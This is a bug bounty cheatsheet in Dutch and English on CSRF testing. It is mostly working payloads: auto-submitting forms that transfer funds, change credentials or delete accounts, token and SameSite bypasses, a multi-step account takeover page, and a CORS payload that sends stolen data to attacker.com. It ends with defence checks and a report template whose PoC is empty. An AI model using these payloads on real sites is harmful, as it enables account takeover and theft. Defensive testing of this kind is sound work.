
# CSRF (Cross-Site Request Forgery) - Bug Bounty Cheatsheet

## Basis Concepten

### Wat is CSRF?

Een attack waarbij een geauthenticeerde user onbedoeld actions uitvoert op een web applicatie waar ze authenticated zijn, door een malicious request van een andere site.

### Vereisten voor CSRF

1. ✅ User is authenticated (cookie-based session)
2. ✅ Actie heeft impact (geld overmaken, wachtwoord wijzigen, etc.)
3. ✅ Geen onvoorspelbare parameters (CSRF token)
4. ✅ Request kan cross-origin gemaakt worden

### Impact

- Account takeover (password/email wijzigen)
- Unauthorized transactions
- Data manipulation
- Privilege escalation
- Social engineering attacks

## Basis CSRF Payloads

### HTML Form Auto-Submit

html

```html
<!-- Basis CSRF PoC -->
<html>
  <body>
    <h1>You won a prize! Click to claim:</h1>
    <form action="https://target.com/api/transfer" method="POST" id="csrf-form">
      <input type="hidden" name="amount" value="1000" />
      <input type="hidden" name="to_account" value="attacker123" />
      <input type="submit" value="Claim Prize!" />
    </form>
    
    <script>
      // Auto-submit
      document.getElementById('csrf-form').submit();
    </script>
  </body>
</html>
```

### GET-Based CSRF

html

```html
<!-- Image tag -->
<img src="https://target.com/api/delete-account?confirm=true" />

<!-- Script tag -->
<script src="https://target.com/api/add-admin?user=attacker"></script>

<!-- Link with auto-click -->
<a href="https://target.com/api/transfer?amount=1000&to=attacker" id="link">Click here</a>
<script>
  document.getElementById('link').click();
</script>

<!-- Iframe -->
<iframe src="https://target.com/api/change-email?email=attacker@evil.com" style="display:none;"></iframe>
```

### POST-Based CSRF

html

```html
<!-- Standard POST form -->
<html>
  <body>
    <form action="https://target.com/api/change-password" method="POST" id="csrf">
      <input type="hidden" name="new_password" value="hacked123" />
      <input type="hidden" name="confirm_password" value="hacked123" />
    </form>
    
    <script>
      document.getElementById('csrf').submit();
    </script>
  </body>
</html>
```

### JSON CSRF

html

```html
<!-- Met XMLHttpRequest -->
<html>
  <body>
    <script>
      var xhr = new XMLHttpRequest();
      xhr.open("POST", "https://target.com/api/update-profile", true);
      xhr.setRequestHeader("Content-Type", "application/json");
      xhr.withCredentials = true;
      
      var data = JSON.stringify({
        "email": "attacker@evil.com",
        "role": "admin"
      });
      
      xhr.send(data);
    </script>
  </body>
</html>
```

### Fetch API CSRF

html

```html
<script>
  fetch('https://target.com/api/delete-account', {
    method: 'POST',
    credentials: 'include',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      confirm: true
    })
  });
</script>
```

## CSRF Token Bypass Techniques

### 1. Missing Token Validation

html

```html
<!-- Test: verwijder CSRF token parameter -->
<!-- Original -->
<form action="/transfer" method="POST">
  <input name="csrf_token" value="abc123xyz" />
  <input name="amount" value="100" />
</form>

<!-- Test zonder token -->
<form action="https://target.com/transfer" method="POST">
  <input name="amount" value="1000" />
</form>
```

### 2. Token Not Tied to User Session

html

```html
<!-- Gebruik token van attacker's account -->
<form action="https://target.com/transfer" method="POST">
  <input name="csrf_token" value="ATTACKER_TOKEN" />
  <input name="amount" value="1000" />
  <input name="to_account" value="attacker" />
</form>
```

### 3. Method Override

html

```html
<!-- Als POST protected is maar GET niet -->
<img src="https://target.com/api/delete?id=123" />

<!-- Method tampering -->
<form action="https://target.com/transfer" method="POST">
  <input name="_method" value="PUT" />
  <input name="amount" value="1000" />
</form>

<!-- Via query parameter -->
<form action="https://target.com/transfer?_method=POST" method="GET">
  <input name="amount" value="1000" />
</form>
```

### 4. Token in URL Instead of Header

html

```html
<!-- Als token in URL staat -->
<img src="https://target.com/api/delete?csrf_token=TOKEN&id=123" />

<!-- Leak token via Referer -->
<a href="https://attacker.com/steal?ref=https://target.com/page?csrf_token=abc123">
  Click here
</a>
```

### 5. Weak Token Generation

javascript

```javascript
// Als token predictable is
// Bijv: Base64(userid + timestamp)
csrf_token = btoa("123" + "1234567890")

// Genereer eigen valid token
var fakeToken = btoa("456" + Date.now());
```

### 6. Token Validation Only on Presence

html

```html
<!-- Test met lege token -->
<form action="https://target.com/transfer" method="POST">
  <input name="csrf_token" value="" />
  <input name="amount" value="1000" />
</form>

<!-- Test met willekeurige token -->
<form action="https://target.com/transfer" method="POST">
  <input name="csrf_token" value="invalid_token_12345" />
  <input name="amount" value="1000" />
</form>
```

### 7. Token Reuse

html

```html
<!-- Gebruik oude/expired token -->
<form action="https://target.com/transfer" method="POST">
  <input name="csrf_token" value="OLD_EXPIRED_TOKEN" />
  <input name="amount" value="1000" />
</form>
```

### 8. Cookie-Based Token Bypass

html

```html
<!-- Als token zowel in cookie als parameter staat -->
<!-- En alleen cookie gevalideerd wordt -->
<form action="https://target.com/transfer" method="POST">
  <!-- Geen csrf parameter nodig -->
  <input name="amount" value="1000" />
</form>

<script>
  // Browser stuurt cookie automatisch mee
  document.cookie = "csrf_token=any_value";
</script>
```

## Content-Type Exploits

### Simple Requests (No Preflight)

html

```html
<!-- Content-Type die geen preflight triggeren -->
<form action="https://target.com/api/update" method="POST" enctype="text/plain">
  <input name='{"email":"attacker@evil.com","role":"admin","ignore":"' value='"}' />
</form>

<!-- Results in: -->
<!-- {"email":"attacker@evil.com","role":"admin","ignore":"="}  -->
```

### Bypassing JSON Validation

html

```html
<script>
  // text/plain bypass
  var xhr = new XMLHttpRequest();
  xhr.open("POST", "https://target.com/api/update", true);
  xhr.setRequestHeader("Content-Type", "text/plain");
  xhr.withCredentials = true;
  
  xhr.send('{"email":"attacker@evil.com"}');
</script>
```

### Form-Data to JSON

html

```html
<!-- Als server accepteert multiple content types -->
<form action="https://target.com/api/update" method="POST" enctype="application/json">
  <input name="email" value="attacker@evil.com" />
</form>
```

## SameSite Cookie Bypass

### SameSite=None

html

```html
<!-- Cookies zonder SameSite of SameSite=None -->
<!-- Volledig vulnerable voor CSRF -->
<img src="https://target.com/api/delete-account" />
```

### SameSite=Lax Bypass

html

```html
<!-- Top-level navigation (GET) binnen 2 minuten -->
<script>
  // Redirect die cookie meestuurt
  window.location = "https://target.com/api/action?param=value";
</script>

<!-- Via meta refresh -->
<meta http-equiv="refresh" content="0; url=https://target.com/api/action?param=value">

<!-- Via link click -->
<a href="https://target.com/api/action?param=value">Click here!</a>
<script>
  document.querySelector('a').click();
</script>
```

### SameSite=Lax POST via Navigation

html

```html
<!-- Gebruik POST via form submission in top-level navigation -->
<html>
  <body>
    <form action="https://target.com/api/update" method="POST" id="form">
      <input name="email" value="attacker@evil.com" />
    </form>
    
    <script>
      // Submit form (triggert top-level navigation)
      document.getElementById('form').submit();
    </script>
  </body>
</html>
```

### Client-Side Redirect Chain

html

```html
<!-- Via subdomain (als SameSite=Lax) -->
<!-- 1. Host malicious page op subdomain.target.com -->
<script>
  // 2. Redirect naar main domain
  window.location = "https://target.com/api/action?param=malicious";
</script>
```

## CORS Misconfiguration + CSRF

### Exploiting Weak CORS

html

```html
<script>
  // Als CORS misconfigured is
  fetch('https://target.com/api/get-csrf-token', {
    credentials: 'include'
  })
  .then(response => response.json())
  .then(data => {
    // Gebruik token voor CSRF
    fetch('https://target.com/api/transfer', {
      method: 'POST',
      credentials: 'include',
      headers: {
        'Content-Type': 'application/json',
        'X-CSRF-Token': data.csrf_token
      },
      body: JSON.stringify({
        amount: 1000,
        to: 'attacker'
      })
    });
  });
</script>
```

### Wildcard Origin Exploit

html

```html
<!-- Als Access-Control-Allow-Origin: * -->
<script>
  fetch('https://target.com/api/sensitive-data', {
    credentials: 'include'
  })
  .then(response => response.json())
  .then(data => {
    // Leak data naar attacker
    fetch('https://attacker.com/steal', {
      method: 'POST',
      body: JSON.stringify(data)
    });
  });
</script>
```

## OAuth/SSO CSRF

### State Parameter Missing

html

```html
<!-- OAuth callback zonder state validation -->
<img src="https://target.com/oauth/callback?code=ATTACKER_CODE" />

<!-- Victim's account linked to attacker's OAuth -->
```

### Account Linking CSRF

html

````html
<!-- Link victim's account to attacker's social media -->
<form action="https://target.com/connect/facebook" method="POST">
  <input name="oauth_token" value="ATTACKER_TOKEN" />
</form>
<script>
  document.forms[0].submit();
</script>
```

## BurpSuite Workflows

### 1. CSRF PoC Generator
```
1. Right-click op request in Proxy/Repeater
2. "Engagement tools" → "Generate CSRF PoC"
3. Options:
   - Include auto-submit script
   - Test in browser
4. Click "Regenerate" voor verschillende formats
5. Save HTML file voor testing
```

### 2. Remove CSRF Token Test
```
1. Send request to Repeater
2. Remove csrf_token parameter
3. Send request
4. Check if succeeds (200 OK + action completed)

Alternative:
- Remove header: X-CSRF-Token
- Remove cookie: csrf_token
- Change parameter name: csrf_token → csrf_token_invalid
```

### 3. Token Reuse Test
```
1. Capture request met valid token in Proxy
2. Send to Repeater
3. Send meerdere keren dezelfde request
4. Check of token blijft werken (no expiry)
```

### 4. Cross-Account Token Test
```
Setup:
1. Login als User A → capture token_A
2. Login als User B → capture token_B
3. Use token_A in User B's session
4. Check of request succeeds
```

### 5. Intruder voor Token Analysis
```
Position markers:
POST /api/transfer
csrf_token=§PAYLOAD§

Payloads:
- Empty string
- Random strings
- Tokens from other users
- Old tokens
- Modified tokens (change 1 character)

Analyze responses voor success indicators
```

### 6. Match & Replace voor Testing
```
Proxy → Options → Match and Replace

Test zonder token:
Type: Request parameter
Match: csrf_token=.*
Replace: [empty]

Test met invalid token:
Type: Request parameter
Match: csrf_token=(.*)
Replace: csrf_token=invalid123
````

## Advanced CSRF Techniques

### Flash CSRF (Legacy)

html

```html
<!-- Cross-domain POST via Flash -->
<object data="csrf.swf">
  <param name="target" value="https://target.com/api/transfer">
  <param name="data" value="amount=1000&to=attacker">
</object>
```

### WebSocket CSRF

html

```html
<script>
  // Als WebSocket geen Origin check heeft
  var ws = new WebSocket('wss://target.com/socket');
  
  ws.onopen = function() {
    // Send malicious message
    ws.send(JSON.stringify({
      action: 'delete_account',
      user_id: 'victim'
    }));
  };
</script>
```

### Server-Side Request Forgery (SSRF) + CSRF

html

```html
<!-- Via SSRF naar internal endpoints -->
<img src="https://target.com/proxy?url=http://localhost/admin/delete-user?id=123" />
```

### Clickjacking + CSRF

html

```html
<!-- Combine CSRF met UI redressing -->
<html>
  <head>
    <style>
      iframe {
        position: absolute;
        width: 500px;
        height: 500px;
        opacity: 0.001;
        z-index: 2;
      }
      button {
        position: absolute;
        top: 200px;
        left: 200px;
        z-index: 1;
      }
    </style>
  </head>
  <body>
    <button>Click to win $1000!</button>
    <iframe src="https://target.com/delete-account"></iframe>
  </body>
</html>
```

### Login CSRF

html

```html
<!-- Login victim met attacker's credentials -->
<form action="https://target.com/login" method="POST" id="login">
  <input name="username" value="attacker" />
  <input name="password" value="AttackerPass123" />
</form>
<script>
  document.getElementById('login').submit();
</script>

<!-- Impact: victim's activities logged in attacker's account -->
```

### Logout CSRF

html

```html
<!-- Force logout victim -->
<img src="https://target.com/logout" />

<!-- Combined met Login CSRF voor account takeover -->
<img src="https://target.com/logout" onload="document.getElementById('login').submit();" />
<form action="https://target.com/login" method="POST" id="login" style="display:none;">
  <input name="username" value="attacker" />
  <input name="password" value="pass123" />
</form>
```

## Testing Checklist

### Basic CSRF Tests

- [ ]  Verwijder CSRF token parameter
- [ ]  Verwijder CSRF token header
- [ ]  Gebruik lege CSRF token
- [ ]  Gebruik random CSRF token
- [ ]  Gebruik CSRF token van andere user
- [ ]  Gebruik oude/expired CSRF token
- [ ]  Test token reuse (multiple submissions)
- [ ]  Test of token tied to session is

### HTTP Method Tests

- [ ]  Change POST naar GET
- [ ]  Change PUT naar POST
- [ ]  Test met method override (_method parameter)
- [ ]  Test HEAD/OPTIONS methods

### Content-Type Tests

- [ ]  Test met text/plain
- [ ]  Test met application/x-www-form-urlencoded
- [ ]  Test met multipart/form-data
- [ ]  Test JSON endpoints
- [ ]  Test XML endpoints

### Cookie Attribute Tests

- [ ]  Check SameSite attribute
- [ ]  Test SameSite=Lax bypass (top-level GET)
- [ ]  Test SameSite=None exploitation
- [ ]  Check Secure flag
- [ ]  Check HttpOnly flag

### State-Changing Operations

- [ ]  Password change
- [ ]  Email change
- [ ]  2FA disable
- [ ]  Account deletion
- [ ]  Money transfer
- [ ]  User creation/deletion
- [ ]  Settings modification
- [ ]  Profile updates
- [ ]  File uploads
- [ ]  OAuth connections

### Advanced Tests

- [ ]  WebSocket CSRF
- [ ]  OAuth state parameter bypass
- [ ]  Clickjacking + CSRF
- [ ]  Login/Logout CSRF
- [ ]  CORS misconfiguration exploitation
- [ ]  Subdomain CSRF

## Automation Tools

### CSRFtester

bash

```bash
# Capture session
csrftester

# Generate test cases
# Tool analyzes forms and generates test HTML files
```

### XSRFProbe

bash

```bash
# Automated CSRF scanner
xsrfprobe -u https://target.com

# With authentication
xsrfprobe -u https://target.com --cookie "session=abc123"

# Specify depth
xsrfprobe -u https://target.com --crawl
```

### Custom Python Script

python

```python
import requests
from bs4 import BeautifulSoup

# Login en krijg session
session = requests.Session()
login_data = {"username": "test", "password": "test123"}
session.post("https://target.com/login", data=login_data)

# Test CSRF
url = "https://target.com/api/change-email"
data = {"email": "attacker@evil.com"}

# Test 1: Zonder CSRF token
response = session.post(url, data=data)
print(f"No token: {response.status_code}")

# Test 2: Met invalid token
data["csrf_token"] = "invalid123"
response = session.post(url, data=data)
print(f"Invalid token: {response.status_code}")

# Test 3: Met token van andere user
data["csrf_token"] = "OTHER_USER_TOKEN"
response = session.post(url, data=data)
print(f"Other user token: {response.status_code}")
```

## PoC Templates

### Basic HTML Form

html

```html
<!DOCTYPE html>
<html>
<head>
  <title>CSRF PoC</title>
</head>
<body>
  <h1>CSRF Proof of Concept</h1>
  
  <form action="https://target.com/api/change-email" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com" />
    <input type="submit" value="Submit" />
  </form>
  
  <!-- Auto-submit after 1 second -->
  <script>
    setTimeout(function() {
      document.forms[0].submit();
    }, 1000);
  </script>
</body>
</html>
```

### Advanced Multi-Step CSRF

html

```html
<!DOCTYPE html>
<html>
<head>
  <title>Multi-Step CSRF</title>
</head>
<body>
  <h1>Processing your request...</h1>
  
  <script>
    // Step 1: Change email
    fetch('https://target.com/api/change-email', {
      method: 'POST',
      credentials: 'include',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({email: 'attacker@evil.com'})
    })
    .then(() => {
      // Step 2: Disable 2FA
      return fetch('https://target.com/api/disable-2fa', {
        method: 'POST',
        credentials: 'include'
      });
    })
    .then(() => {
      // Step 3: Change password
      return fetch('https://target.com/api/change-password', {
        method: 'POST',
        credentials: 'include',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
          new_password: 'Hacked123!',
          confirm_password: 'Hacked123!'
        })
      });
    })
    .then(() => {
      alert('Account compromised!');
    });
  </script>
</body>
</html>
```

### Stealth CSRF (No User Interaction)

html

```html
<!DOCTYPE html>
<html>
<head>
  <title>Legitimate Looking Page</title>
</head>
<body>
  <h1>Welcome to our site!</h1>
  <p>Loading content...</p>
  
  <!-- Hidden iframe for CSRF -->
  <iframe style="display:none;" name="csrf-frame"></iframe>
  
  <!-- Hidden form -->
  <form action="https://target.com/api/delete-account" 
        method="POST" 
        target="csrf-frame" 
        id="csrf-form" 
        style="display:none;">
    <input name="confirm" value="true" />
  </form>
  
  <script>
    // Auto-submit zonder user interaction
    window.onload = function() {
      document.getElementById('csrf-form').submit();
    };
  </script>
</body>
</html>
```

## Defense Verification

### Check CSRF Protection

bash

````bash
# Check voor anti-CSRF tokens
curl -v https://target.com/form | grep csrf

# Check SameSite cookies
curl -v https://target.com | grep -i "set-cookie"
# Look for: SameSite=Strict or SameSite=Lax

# Check CORS headers
curl -H "Origin: https://evil.com" \
     -v https://target.com/api/endpoint
# Look for: Access-Control-Allow-Origin
```

### Good Defenses
```
✅ Synchronizer Token Pattern
✅ SameSite=Strict cookies (voor high-value actions)
✅ SameSite=Lax cookies (algemeen)
✅ Custom request headers (X-Requested-With)
✅ Double Submit Cookie
✅ Origin/Referer validation
✅ Re-authentication voor sensitive actions
```

## Impact Examples

### Critical Impact
```
1. Account Takeover
   - Change email + password
   - Disable 2FA
   - Link OAuth accounts

2. Financial Loss
   - Unauthorized money transfers
   - Change payment details
   - Purchase items

3. Data Breach
   - Export sensitive data
   - Share private files
   - Grant access to third parties
```

### High Impact
```
1. Privilege Escalation
   - Add admin users
   - Modify permissions
   - Delete users

2. Content Manipulation
   - Delete posts/comments
   - Modify settings
   - Upload files
````

## Reporting Template

markdown

````markdown
## Vulnerability: Cross-Site Request Forgery (CSRF)

**Severity:** High

**Endpoint:** /api/change-email

**Description:**
De email wijzig functionaliteit is kwetsbaar voor CSRF attacks. Er is geen CSRF token validatie, waardoor een attacker via een malicious website de email kan wijzigen van een authenticated user.

**Affected Functionality:**
- Email change
- [List other affected endpoints]

**Prerequisites:**
- Victim moet authenticated zijn
- Victim moet malicious page bezoeken

**Steps to Reproduce:**
1. Login op target.com als victim
2. Bezoek attacker's malicious page (PoC below)
3. Email wordt automatisch gewijzigd naar attacker@evil.com
4. Victim kan account niet meer recoveren

**Proof of Concept:**
```html



  
    
  
  
    document.getElementById('csrf').submit();
  


```

**HTTP Request:**
```
POST /api/change-email HTTP/1.1
Host: target.com
Cookie: session=VICTIM_SESSION
Content-Type: application/x-www-form-urlencoded

email=attacker@evil.com
```

**Impact:**
- Complete account takeover mogelijk
- Attacker kan email wijzigen → password reset → full access
- No user interaction vereist (auto-submit)
- Affects alle authenticated users

**Attack Scenario:**
1. Attacker host malicious page op evil.com
2. Attacker stuurt phishing email met link
3. Victim klikt link terwijl ingelogd op target.com
4. CSRF execute → email gewijzigd
5. Attacker doet password reset naar nieuwe email
6. Complete account takeover

**Remediation:**
1. **Implement CSRF Tokens:**
   - Generate unique token per session
   - Validate token server-side
   - Token in form en HTTP header

2. **SameSite Cookie Attribute:**
```
   Set-Cookie: session=abc123; SameSite=Strict; Secure; HttpOnly
```

3. **Additional Defenses:**
   - Verify Origin/Referer headers
   - Require re-authentication voor sensitive actions
   - Implement custom request headers
   - Use double submit cookie pattern

4. **Framework Solutions:**
   - Django: Use {% csrf_token %}
   - Rails: Use authenticity_token
   - Express: Use csurf middleware
   - Spring: Enable CSRF protection

**References:**
- OWASP CSRF Prevention Cheat Sheet
- CWE-352: Cross-Site Request Forgery (CSRF)
````

## Additional Resources

**Tools:**

- Burp Suite CSRF PoC Generator
- XSRFProbe
- CSRFtester
- OWASP CSRFGuard

**Testing Platforms:**

- DVWA (Damn Vulnerable Web Application)
- bWAPP
- WebGoat